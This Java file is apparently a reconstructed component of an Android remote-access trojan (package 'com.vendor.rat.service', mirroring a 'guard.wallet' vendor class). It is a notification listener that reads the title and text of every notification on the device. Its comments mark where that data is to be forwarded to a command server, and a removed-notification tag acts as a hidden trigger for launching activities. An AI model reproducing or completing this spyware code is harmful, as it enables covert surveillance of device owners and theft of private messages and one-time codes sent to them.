package com.vendor.rat.service;

import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Vendor: com.guard.wallet.service.CustomNotificationService
 * NotificationListenerService that captures device notifications
 * and forwards them to the command server.
 */
public class CustomNotificationService extends NotificationListenerService {

    private static final String TAG = "MyNotificationListener";
    public static volatile CustomNotificationService instance;
    public Integer connectionState = 0;
    public final AtomicBoolean bound = new AtomicBoolean(false);

    public static void unbindAndClear() {
        try {
            if (instance != null) {
                synchronized (CustomNotificationService.class) {
                    if (instance != null) {
                        if (instance.bound.get()) {
                            instance.requestUnbind();
                        }
                        instance = null;
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "unbindAndClear error", e);
        }
    }

    @Override
    public final IBinder onBind(Intent intent) {
        Log.d(TAG, "onBind");
        this.bound.set(true);
        return super.onBind(intent);
    }

    @Override
    public final void onDestroy() {
        super.onDestroy();
        unbindAndClear();
    }

    @Override
    public final void onListenerConnected() {
        super.onListenerConnected();
        this.connectionState = 1;
        if (instance == null) {
            synchronized (CustomNotificationService.class) {
                if (instance == null) {
                    instance = this;
                }
            }
        }
        Log.d(TAG, "onListenerConnected");
    }

    @Override
    public final void onListenerDisconnected() {
        super.onListenerDisconnected();
        this.connectionState = 0;
        Log.d(TAG, "onListenerDisconnected");
        unbindAndClear();
    }

    @Override
    public final void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        this.connectionState = 1;
        try {
            String packageName = sbn.getPackageName();
            if (packageName == null || packageName.isEmpty()) {
                return;
            }
            Bundle extras = sbn.getNotification().extras;
            String title = null;
            String text = null;
            String bigText = null;
            String subText = null;
            if (extras != null) {
                title = extras.getString("android.title");
                text = extras.getString("android.text");
                bigText = extras.getString("android.bigText");
                subText = extras.getString("android.subText");
            }
            // ADAPT: vendor creates DeviceNotificationVO with full notification data
            // and forwards via MainApplication.getInstance().getHandlerMsgAndTimer().b()
            // TODO: VENDOR_VERIFY - notification forwarding to command server
            Log.d(TAG, "onNotificationPosted: " + packageName
                + " title=" + title + " text=" + text);
        } catch (Exception e) {
            Log.e(TAG, "onNotificationPosted error", e);
        }
    }

    @Override
    public final void onNotificationRemoved(StatusBarNotification sbn) {
        super.onNotificationRemoved(sbn);
        this.connectionState = 1;
        Log.d(TAG, "Notification Removed from PackageName:" + sbn.getPackageName());
        String tag = sbn.getTag();
        if (tag != null && !tag.isEmpty() && tag.startsWith("startActivity:")) {
            try {
                String[] parts = tag.split(":");
                String pkg = parts.length >= 2 ? parts[1] : null;
                String cls = parts.length >= 3 ? parts[2] : null;
                if (pkg != null && !pkg.isEmpty()) {
                    // ADAPT: vendor calls utils.g.Y0(pkg, cls) to launch activity
                    Log.d(TAG, "startActivity from notification: " + pkg + "/" + cls);
                }
            } catch (Exception e) {
                Log.e(TAG, "onNotificationRemoved error", e);
            }
        }
    }

    @Override
    public final boolean onUnbind(Intent intent) {
        Log.d(TAG, "onUnbind");
        this.bound.set(false);
        return super.onUnbind(intent);
    }
}